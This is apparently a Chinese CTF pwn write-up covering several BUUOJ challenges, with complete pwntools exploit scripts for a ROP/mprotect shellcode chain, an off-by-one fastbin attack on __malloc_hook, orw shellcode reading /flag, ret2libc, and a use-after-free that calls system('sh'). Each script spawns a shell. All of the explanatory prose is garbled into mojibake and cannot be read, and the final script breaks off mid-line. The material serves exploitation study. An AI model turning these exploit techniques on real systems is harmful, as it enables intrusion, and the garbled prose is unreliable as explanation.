<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.arch = &#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29872</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./simplerop&#x27;</span>) </span><br><span class="line">pop_esi_pop_edi_pop_ebp_ret = <span class="number">0x0804838c</span></span><br><span class="line">pop_edi_pop_ebp_ret = <span class="number">0x0804838d</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_ecx_pop_ebx_ret = <span class="number">0x0806e851</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e82a</span></span><br><span class="line">int_0x80 = <span class="number">0x080493e1</span></span><br><span class="line">offset = <span class="number">0x1c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>)  + p32(e.sym[<span class="string">&#x27;mprotect&#x27;</span>])  + p32(pop_esi_pop_edi_pop_ebp_ret) + p32(e.bss() &amp; (<span class="number">0xffff000</span>)) + p32(<span class="number">0x2000</span>) + p32(<span class="number">0x7</span>) + p32(e.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_esi_pop_edi_pop_ebp_ret) + p32(<span class="number">0</span>) + p32(e.bss() + <span class="number">0x50</span>) + p32(<span class="number">0x50</span>) + p32(e.bss() + <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/24/K9HYDXUd3SPvN8c.png"></p>
<h2 id="0x02E-roarctf-2019-easy-pwn-off-by-one-fastbin-attack-one-gadget"><a href="#0x02E-roarctf-2019-easy-pwn-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="0x02E.roarctf_2019_easy_pwn - off by one + fastbin attack + one_gadget"></a>0x02E.roarctf_2019_easy_pwn - off by one + fastbin attack + one_gadget</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œ<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼ˆå™”  å™”  å’šï¼‰</p>
<p><img src="https://i.loli.net/2021/01/24/uwHcW7SZ4sBbOLo.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/01/24/eHNDfbkXEtBR49y.png"></p>
<p>ä¿æŠ¤å…¨å¼€çš„é¢˜ä¸å‡ºæ„å¤–åº”å½“æ˜¯ä¸€é“å †é¢˜ï¼Œè¿™é¢˜ä¹Ÿä¸ä¾‹å¤–</p>
<p>ç¨‹åºæœ¬èº«æœ‰<strong>ç€åˆ†é…ã€ç¼–è¾‘ã€é‡Šæ”¾ã€æ‰“å°</strong>å †å—çš„åŠŸèƒ½</p>
<p>æ¼æ´ç‚¹åœ¨äºeditåŠŸèƒ½ä¸­ï¼Œè‹¥æ˜¯è¾“å…¥çš„sizeåˆšå¥½æ˜¯åŸsize + 10çš„è¯å°±ä¼šå…è®¸å¤šè¾“å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå³<strong>å­˜åœ¨off by oneæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/01/24/BNqzXb4APk5pOIx.png"></p>
<p>é¢˜ç›®ä¸­å¯¹äºchunk sizeçš„é™åˆ¶æ˜¯4096ï¼ˆå››èˆäº”å…¥ç­‰äºæ²¡æœ‰ï¼‰ï¼Œæ•…è€ƒè™‘<strong>é€šè¿‡off by oneæ¼æ´ä¿®æ”¹ç›¸é‚»chunkçš„sizeæ„é€ overlapping chunkæ³„éœ²libcåŸºå€åé€šè¿‡overlapping chunkè¿›è¡Œfastbin attackæ„é€ __malloc_hook - 0x23é™„è¿‘çš„fake chunkåä¿®æ”¹__malloc_hookä¸ºone_gadgetååˆ†é…ä»»æ„chunkå³å¯get shell</strong></p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯one_gadgetå¯¹äºæ ˆå¸§æ˜¯æœ‰ç€ä¸€å®šè¦æ±‚çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨reallocå‡½æ•°ä¸­çš„gadgetæ¥è¿›è¡Œå‹æ ˆç­‰æ“ä½œæ¥æ»¡è¶³one_gadgetçš„è¦æ±‚</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,27009)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x18</span>) <span class="comment"># idx0</span></span><br><span class="line">    new(<span class="number">0x18</span>) <span class="comment"># idx1</span></span><br><span class="line">    new(<span class="number">0x80</span>) <span class="comment"># idx2</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x18</span> + <span class="number">10</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\xb1&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0xa0</span>) <span class="comment"># idx1</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x20</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx2</span></span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx4</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x18</span> + <span class="number">10</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx1</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx5, overlapping chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin attack</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx3</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment"># idx5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">11</span> + <span class="number">0x10</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/24/yuadEcW1nU6AxZe.png"></p>
<blockquote>
<p>è¯´å®è¯ç¬”è€…è§‰å¾—è¿™é“é¢˜è´¨é‡ä¸€èˆ¬â€¦æœ‰ç§ä¸ºäº†å‡ºé¢˜è€Œå‡ºé¢˜çš„æ„Ÿè§‰â€¦</p>
</blockquote>
<h2 id="0x02F-pwnable-orw-orw"><a href="#0x02F-pwnable-orw-orw" class="headerlink" title="0x02F.pwnable_orw - orw"></a>0x02F.pwnable_orw - orw</h2><blockquote>
<p>pwnablt.twçš„åˆ·é¢˜è®°å½•è§<a target="_blank" rel="noopener" href="https://archive.next.arttnba3.cn/">è¿™é‡Œ</a>ï¼Œå› ä¸ºæ˜¯åšè¿‡çš„é¢˜æ‰€ä»¥ç›´æ¥æŠŠå½“æ—¶çš„wpæ¬è¿‡æ¥äº†www</p>
</blockquote>
<p>é¦–å…ˆå¯ä»¥çœ‹åˆ°é¢˜ç›®å¯¹ç¯å¢ƒåšå‡ºäº†ä¸€å®šçš„é™åˆ¶</p>
<p><img src="https://i.loli.net/2020/08/31/39DbCjwxMeYLKry.png" alt="image.png"></p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†<code>canary</code></p>
<p><img src="https://i.loli.net/2020/08/31/pHOQYVeolKvJkxD.png" alt="D_V73A_Y0XS1HEU~_CXRZSH.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/08/31/ZtL23IAugR61TzU.png" alt="image.png"></p>
<p>ä¸»ç¨‹åºä¸€å¼€å§‹ä¼šå…ˆè°ƒç”¨<code>orw_seccomp()</code>å‡½æ•°ï¼Œæˆ‘ä»¬ç‚¹è¿›å»åº·åº·</p>
<p><img src="https://i.loli.net/2020/08/31/nlyewbocGB6zOrv.png" alt="image.png"></p>
<p>v4æ˜¯canaryçš„å€¼ï¼Œæˆ‘ä»¬ç°åœ¨è¿˜ä¸çŸ¥é“æ˜¯å¦éœ€è¦ç»•è¿‡canaryï¼Œæ•…å…ˆä¸äºˆç†ä¼š</p>
<p>æ¥ä¸‹æ¥è°ƒç”¨äº†<code>qmemcpy()</code>å‡½æ•°ï¼Œå®é™…ä¸Šå°±æ˜¯<code>memcpy</code>å‡½æ•°ï¼Œå°†ä»0x8048640åœ°å€å¼€å§‹æ‹·è´0x60å­—èŠ‚çš„æ•°æ®åˆ°v3ä¸­ï¼Œéšåèµ‹å€¼12ç»™v1ï¼Œv2ä½œä¸ºæŒ‡é’ˆè·å–v3çš„é¦–å­—èŠ‚åœ°å€</p>
<p>æœ€åè°ƒç”¨<code>prctl()</code>å‡½æ•°ï¼Œç»“åˆé¢˜ç›®çš„è¯´æ˜ï¼Œæˆ‘ä»¬å¤§è‡´å¯ä»¥çŒœæµ‹åˆ°<code>orw_seccomp()</code>å‡½æ•°çš„ä½œç”¨åº”è¯¥æ˜¯<strong>ç¦ç”¨å…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»…å¼€æ”¾sys_readã€sys_writeã€sys_open</strong></p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬<strong>æ— æ³•é€šè¿‡sys_execveæ¥getshell</strong></p>
<p>æ¥ä¸‹æ¥å›åˆ°ä¸»å‡½æ•°ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“çœ‹å‡ºè¯¥ç¨‹åºä¼šè¯»å…¥æœ€å¤§0xC8å­—èŠ‚è¾“å…¥å¹¶å°è¯•æ‰§è¡Œè¯¥è¾“å…¥</p>
<p>ç»“åˆé¢˜ç›®è¯´æ˜ï¼Œæˆ‘ä»¬<strong>ä»…è€ƒè™‘æ„é€ shellcodeæ¥cat flag</strong></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode = shellcraft.open(&#x27;/flag&#x27;)</span><br><span class="line">shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)</span><br><span class="line">shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)</span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;, 28333)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2021/01/24/ZGiW28sj5C6kdht.png"></p>
<h2 id="0x030-jarvisoj-level1-ret2shellcode-ret2libc"><a href="#0x030-jarvisoj-level1-ret2shellcode-ret2libc" class="headerlink" title="0x030.jarvisoj_level1 - ret2shellcode | ret2libc"></a>0x030.jarvisoj_level1 - ret2shellcode | ret2libc</h2><blockquote>
<p>åŒæ ·æ˜¯ä¸€é“å±‘é¢˜</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³ï¼Œå››èˆäº”å…¥å¯ä»¥ä¸ºæ‰€æ¬²ä¸º</p>
<p><img src="https://i.loli.net/2021/01/31/ugYwlvbIi9dTxPZ.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/01/31/aI9leRATcW5ZqSn.png"></p>
<p>ç»™å‡ºäº†æ ˆä¸Šåœ°å€ä¸”å­˜åœ¨æº¢å‡ºï¼Œç›´æ¥å†™å…¥shellcodeåè¿”å›åˆ°æ ˆä¸Šå³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 28701)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;this:&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;?&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">payload = asm(shellcraft.sh()).ljust(offset, <span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(stack_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬ä¼šå‘ç°æœ¬åœ°æ‰“çš„é€šè¿œç¨‹æ‰“ä¸é€šâ€¦</p>
<p>è¿™æ˜¯ç”±äºè¿œç¨‹ä¸æ˜åŸå› ä¸ä¼šç»™å‡ºè¿™ä¸ªåœ°å€ï¼Œæ•…è€ƒè™‘ç›´æ¥ret2libc</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 28701)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv() <span class="comment"># comment out this line when attacking remote</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/31/1lypQMbUJSZg9Bk.png"></p>
<h1 id="0x031-0x040"><a href="#0x031-0x040" class="headerlink" title="0x031 ~ 0x040"></a>0x031 ~ 0x040</h1><h2 id="0x031-ciscn-2019-n-3-Use-After-Free"><a href="#0x031-ciscn-2019-n-3-Use-After-Free" class="headerlink" title="0x031.ciscn_2019_n_3 - Use After Free"></a>0x031.ciscn_2019_n_3 - Use After Free</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXå’Œcanaryï¼ˆ<del>åˆæ˜¯32ä½å †é¢˜ï¼Œå¥½çƒ¦a</del></p>
<p><img src="https://i.loli.net/2021/01/31/neG2dQumBhsrzLD.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¤§æ¦‚æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°å †å—åŠŸèƒ½çš„ç¨‹åº</p>
<p><img src="https://i.loli.net/2021/02/01/rcKNdhuEGpJb1CH.png"></p>
<p>é‡Šæ”¾å †å—æ—¶ç”¨çš„æ˜¯å †å—ä¸Šçš„å‡½æ•°æŒ‡é’ˆ</p>
<p><img src="https://i.loli.net/2021/02/01/HloCX5q9FbcuvRf.png"></p>
<p>åœ¨é‡Šæ”¾å †å—åä¸ä¼šå°†å †å—æŒ‡é’ˆç½®NULLï¼Œ<strong>å­˜åœ¨UAFæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/02/01/lBSJXRweGYZjWMN.png"></p>
<p><img src="https://i.loli.net/2021/02/01/dQPegf7Bs9NVhxX.png"></p>
<p>ç”±äºç¨‹åºä¸­å­˜åœ¨systemå‡½æ•°ï¼Œæ•…è€ƒè™‘é€šè¿‡UAFè¦†å†™å †å—æŒ‡é’ˆä¸ºsystemåæ‰§è¡Œ<code>system(&quot;sh&quot;)</code>ä»¥get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 27248)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command: <span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;CNote&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index: <span class="built_in">int</span>, value: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Type&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Value&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(value).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index: <span class="built_in">int</span>, length: <span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Type&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Value &gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x114</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x114</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0xc</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(e.sym[<span class="string">&#x27;system&#x27;</span>])) <span class="comment"># idx2, overlapping with idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span 